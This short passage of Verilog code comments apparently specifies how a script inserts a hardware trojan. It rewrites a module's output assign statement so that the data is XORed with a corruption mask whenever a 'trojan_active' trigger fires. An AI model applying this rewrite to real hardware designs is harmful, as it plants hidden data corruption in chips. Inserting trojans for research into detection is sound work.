...
//
// IMPORTANT: wr_data_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If wr_data_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for wr_data_i (or first output assign):
//     assign wr_data_i = <expr>;
//   Replace with:
//     assign wr_data_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
